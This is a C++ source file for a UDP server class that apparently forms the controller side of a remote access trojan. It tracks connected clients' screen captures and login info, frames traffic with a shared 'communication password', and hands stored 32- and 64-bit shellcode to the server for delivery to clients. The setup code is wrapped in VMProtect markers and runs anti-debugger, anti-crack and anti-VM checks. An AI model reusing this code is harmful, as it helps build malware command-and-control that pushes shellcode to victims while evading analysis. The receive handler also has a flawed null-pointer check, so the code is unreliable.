#include "stdafx.h"
#include "HpUdpServer.h"

PVOID CHpUdpServer::Shellcode32 = NULL;
int CHpUdpServer::ShellcodeSize32 = 0;
PVOID CHpUdpServer::Shellcode64 = NULL;
int CHpUdpServer::ShellcodeSize64 = 0;

CHpUdpServer::CHpUdpServer(void) :m_UdpServer(this)
{

	TRACE("%s \r\n", __FUNCTION__);
	B_run = TRUE;
	m_UdpServer->SetMarkSilence(TRUE);
	//InitializeCriticalSection(&m_cs);
}

CHpUdpServer::~CHpUdpServer(void)
{
	Shutdown();
	//m_UdpServer->SetDetectAttempts(0);
 //   m_UdpServer->SetDetectInterval(0);
	if (m_UdpServer->GetState() != SS_STOPPED)
		m_UdpServer->Stop();
	while (m_UdpServer->GetState() != SS_STOPPED)
	{
		Sleep(300);
	}
	//DeleteCriticalSection(&m_cs);
}


BOOL CHpUdpServer::Initialize(NOTIFYPROC pNotifyProc, int nMaxConnections, TCHAR* ip, int nPort)
{
	int itnnum = 99;
	VMPSTAR
		m_UdpServer->SetDetectAttempts(3);
	m_UdpServer->SetDetectInterval(30000);
	m_UdpServer->SetMaxMessageSize(4096);
	m_UdpServer->SetMaxConnectionCount(ONLINE_NUM*2);
	m_maxConnection = nMaxConnections;
	m_UdpServer->SetSendPolicy(SP_DIRECT);
	m_UdpServer->SetNoDelay(TRUE);
	m_UdpServer->SetTurnoffCongestCtrl(TRUE);
	m_UdpServer->SetFlushInterval(1000);
	m_UdpServer->SetResendByAcks(2);
	if (ShellcodeSize32 > 0 && ShellcodeSize64 > 0)
		m_UdpServer->SetShellCodeData((BYTE*)Shellcode32, ShellcodeSize32, (BYTE*)Shellcode64, ShellcodeSize64);
#ifndef _DEBUG
	CHECK_PROTECTION(itnnum, 4);		//检查破解
	CHECK_DEBUGGER(itnnum, 4);			//检查调试
	CHECK_CODE_INTEGRITY(itnnum, 4);	//检查补丁
	CHECK_REGISTRATION(itnnum, 4);		//检查是否注册
	CHECK_VIRTUAL_PC(itnnum, 4);		//VMWare/VirtualPC
#else
	itnnum = 4;
#endif
	m_pNotifyProc = pNotifyProc;
	_tcscpy_s(m_ip, ip);
	m_port = nPort;
	m_stop = FALSE;
	m_headerlength = itnnum + 10;
	VMPEND
		BOOL ret = m_UdpServer->Start(_T("0.0.0.0"), nPort);
	if (ret)
	{
		UINT  nThreadID;
		hThreadHeartWorker = (HANDLE)_beginthreadex(NULL,					// Security
			0,						// Stack size - use default
			ThreadHeartbeat,     		// Thread fn entry point
			(void*)this,			// Param for thread
			0,						// Init flag
			&nThreadID);			// Thread address
	}

	return ret;
}

unsigned CHpUdpServer::ThreadHeartbeat(LPVOID thisContext)
{
	// Get back our pointer to the class
	CHpUdpServer* pThis = reinterpret_cast<CHpUdpServer*>(thisContext);
	ASSERT(pThis);
	while (pThis->B_run)
	{
		for (int i = 0; i < 10 && pThis->B_run; i++)
			Sleep(500);
		pThis->m_UdpServer->DisconnectSilenceConnections(30000);
	}
	return 0;
}

EnHandleResult CHpUdpServer::OnPrepareListen(IUdpServer* pSender, SOCKET soListen)
{
	TRACE("%s \r\n", __FUNCTION__);
	SYS_SSO_SendBuffSize(soListen, MAX_SEND_BUFFER);
	SYS_SSO_RecvBuffSize(soListen, MAX_RECV_BUFFER);

	return HR_OK;
}

EnHandleResult CHpUdpServer::OnAccept(IUdpServer* pSender, CONNID dwConnID, UINT_PTR soClient)
{
	TRACE("%s  --%d\r\n", __FUNCTION__, dwConnID);
	return HR_OK;
}

EnHandleResult CHpUdpServer::OnHandShake(IUdpServer* pSender, CONNID dwConnID)
{
	TRACE("%s --%d\r\n", __FUNCTION__, dwConnID);
	if (!B_run)return HR_ERROR;
	ClientContext* pContext = NULL;
	//EnterCriticalSection(&m_cs);
	m_clcs.lock();
	if (!m_listFreePool.IsEmpty())
	{
		pContext = m_listFreePool.RemoveHead();
	}
	else
	{
		pContext = new(std::nothrow) ClientContext;
	}
	//LeaveCriticalSection(&m_cs);
	m_clcs.unlock();

	if (pContext == NULL) 	return HR_ERROR;

	ZeroMemory(pContext, sizeof(ClientContext));
	pContext->m_bIsMainSocket = FALSE;
	memset(pContext->m_Dialog, 0, sizeof(pContext->m_Dialog));
	pContext->pView = NULL;
	pContext->m_Socket = dwConnID;
	pContext->switchsocket = udp;
	pContext->m_server = this;
	pContext->LoginInfo = NULL;
	pContext->ScreenPicture = NULL;
	pContext->PictureSize = 0;
	pContext->IsConnect = 666;
	pContext->m_bIsSys = FALSE;
	int iAddressLen = sizeof(pContext->szAddress) / sizeof(TCHAR);
	pSender->GetRemoteAddress(dwConnID, pContext->szAddress, iAddressLen, pContext->usPort);
	_tcscpy_s(pContext->m_ip, m_ip);
	pContext->m_port = m_port;
	if (!m_UdpServer->SetConnectionExtra(dwConnID, pContext))
		return HR_ERROR;
	return HR_OK;
}


EnHandleResult CHpUdpServer::OnSend(IUdpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength)
{
	return HR_OK;
}



EnHandleResult CHpUdpServer::OnReceive(IUdpServer* pSender, CONNID dwConnID, const BYTE* pData, int iLength)
{
	//	TRACE("%s --%d\r\n", __FUNCTION__, dwConnID);
	ClientContext* pContext = NULL;
	if ((!m_UdpServer->GetConnectionExtra(dwConnID, (PVOID*)&pContext)) && (pContext != nullptr) && (iLength <= 0))
		return HR_ERROR;
	if (pContext->IsConnect!=666) return HR_ERROR;
	pContext->m_CompressionBuffer.Write((PBYTE)pData, iLength);
	m_pNotifyProc(pContext, NC_RECEIVE);
	// 检测数据大小
	while ((int)pContext->m_CompressionBuffer.GetBufferLen() > m_headerlength)
	{
		if (pContext->m_password[8] != TOKEN_ACTIVED)
		{
			for (size_t i = 0; i < 9; i++)
			{
				if (pContext->m_password[i] != 0)
					return HR_ERROR;
			}
			memcpy(pContext->m_password, pContext->m_CompressionBuffer.GetBuffer(4),10);
			(pContext->m_password[9] == 1) ? (pContext->bisx86 = FALSE) : (pContext->bisx86 = TRUE);
		}
		int nSize = 0;
		CopyMemory(&nSize, pContext->m_CompressionBuffer.GetBuffer(0), sizeof(int));
		if ((nSize > 0) && (((int)pContext->m_CompressionBuffer.GetBufferLen()) >= nSize))
		{
			if ((int)pContext->m_CompressionBuffer.GetBufferLen() < nSize)
			{
				TRACE("%s %d  memcmp  baddata \r\n", __FUNCTION__, dwConnID);
				return HR_ERROR;
			}
			try
			{
				pContext->m_allpack_rev++;
				pContext->m_alldata_rev += nSize;
				pContext->m_DeCompressionBuffer.ClearBuffer();								//清理旧数据
				if (pContext->m_password[8] != TOKEN_ACTIVED)
					return HR_ERROR;
				pContext->m_DeCompressionBuffer.Write(pContext->m_CompressionBuffer.GetBuffer(m_headerlength), nSize - m_headerlength, 1, pContext->m_password);	//写入数据
				m_pNotifyProc(pContext, NC_RECEIVE_COMPLETE);
				pContext->m_CompressionBuffer.Delete(nSize);						//清理剩下数据
			}
			catch (...)
			{
				return HR_ERROR;
			}
		}
		else
			break;
	}
	return HR_OK;
}

EnHandleResult CHpUdpServer::OnClose(IUdpServer* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode)
{
	TRACE("%s  %d---%d\r\n", __FUNCTION__, dwConnID, iErrorCode);
	ClientContext* pContext = NULL;
	if (m_UdpServer->GetConnectionExtra(dwConnID, (PVOID*)&pContext) && pContext != nullptr)
		m_UdpServer->SetConnectionExtra(dwConnID, NULL);
	if (!pContext)  return HR_OK;
	pContext->IsConnect = 888;
	m_pNotifyProc(pContext, NC_CLIENT_DISCONNECT);
	MovetoFreePool(pContext);
	return HR_OK;
}

void CHpUdpServer::MovetoFreePool(ClientContext* pContext)
{
	if (pContext->PictureSize != 0)
	{
		pContext->PictureSize = 0;
		SAFE_DELETE_AR(pContext->ScreenPicture);
	}
	pContext->pView = NULL;
	pContext->m_bIsMainSocket = FALSE;
	pContext->m_CompressionBuffer.FreeBuffer();
	pContext->m_WriteBuffer.FreeBuffer();
	pContext->m_DeCompressionBuffer.FreeBuffer();
	//EnterCriticalSection(&m_cs);
	m_clcs.lock();
	m_listFreePool.AddTail(pContext);
	m_clcs.unlock();
	//LeaveCriticalSection(&m_cs);
}

EnHandleResult CHpUdpServer::OnShutdown(IUdpServer* pSender)
{
	TRACE("%s \r\n", __FUNCTION__);
	return HR_OK;
}

void CHpUdpServer::Send(ClientContext* pContext, LPBYTE lpData, UINT nSize)
{
	TRACE("%s \r\n", __FUNCTION__);
	if (pContext == NULL) 		return;
	if (pContext->IsConnect!=666) return;
	if (nSize > 0 && B_run)
	{
		pContext->m_allpack_send++;
		pContext->m_alldata_send += nSize;
		LONG nBufLen = nSize + m_headerlength;
		pContext->m_WriteBuffer.Write((PBYTE)&nBufLen, 4);			//总数据长度 4位
		pContext->m_WriteBuffer.Write((PBYTE)pContext->m_password, 10);				//通信密码
		pContext->m_WriteBuffer.Write(lpData, nSize, 1, pContext->m_password);		//数据
		SendWithSplit(pContext->m_Socket, pContext->m_WriteBuffer.GetBuffer(), pContext->m_WriteBuffer.GetBufferLen(), 4000);
		pContext->m_WriteBuffer.ClearBuffer();
	}

}


BOOL CHpUdpServer::SendWithSplit(CONNID dwConnID, LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int nSend = 0;
	UINT nSendRetry = 0;
	if (nSize >= nSplitSize)
	{
		UINT i = 0;
		nSendRetry = nSize / nSplitSize;
		for (i = 0; i < nSendRetry; i++)
		{
			BOOL rt = m_UdpServer->Send(dwConnID, lpData, nSplitSize);
			lpData += nSplitSize;
			nSend += nSplitSize;
		}
		if (nSize - nSend < nSplitSize)
		{
			if (nSize - nSend > 0)
			{
				BOOL rt = m_UdpServer->Send(dwConnID, lpData, nSize - nSend);
			}
		}
	}
	else
	{
		BOOL rt = m_UdpServer->Send(dwConnID, lpData, nSize);
	}
	return  TRUE;
}

void CHpUdpServer::Shutdown()
{
	if (B_run == FALSE)
		return;
	B_run = FALSE;
	WaitForSingleObject(hThreadHeartWorker, INFINITE);
	CloseHandle(hThreadHeartWorker);
	CONNID pIDs[65535] = { 0 };
	DWORD dwCount = 65535;
	BOOL status = m_UdpServer->GetAllConnectionIDs(pIDs, dwCount);
	if (status && (dwCount > 0))
	{
		for (DWORD i = 0; i < dwCount; i++)
		{
			Disconnect(pIDs[i]);
		}
	}
	m_UdpServer->Stop();
	while (!m_listFreePool.IsEmpty())
		delete m_listFreePool.RemoveTail();

}


BOOL CHpUdpServer::Disconnect(CONNID dwConnID)
{
	m_UdpServer->Disconnect(dwConnID);
	return 0;
}


BOOL CHpUdpServer::IsOverMaxConnectionCount()
{
	return (m_UdpServer->GetConnectionCount() > (DWORD)m_maxConnection) ? TRUE : FALSE;
}



